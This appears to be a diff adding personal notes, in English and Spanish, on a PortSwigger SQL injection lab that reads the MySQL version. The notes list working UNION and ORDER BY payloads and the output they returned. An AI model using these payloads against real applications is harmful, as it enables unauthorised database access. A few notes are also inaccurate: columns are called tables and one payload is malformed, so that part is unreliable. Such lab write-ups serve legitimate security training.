@@ -1,0 +1,33 @@
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+To solve the lab, display the database version string.
+
+Análisis:
+-------
+Hoja de trucos
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+1) Determinar la cantidad de columnas
+' order by 1#
+' order by 2#
+' order by 3# --> Internal Server Error
+
+3-1=2 tablas
+
+2) Determinar el tipo de datos
+
+primero veo si es una BD oraccle con
+' UNION select 'a','b' FROM DUAL# --> Oracle database
+
+' UNION SELECT 'a','b# --> 200 OK
+
+
+Solución:
+--------
+' UNION SELECT @@version,'b'#
+
+<th>8.0.36-0ubuntu0.20.04.1</th>
+
+
+
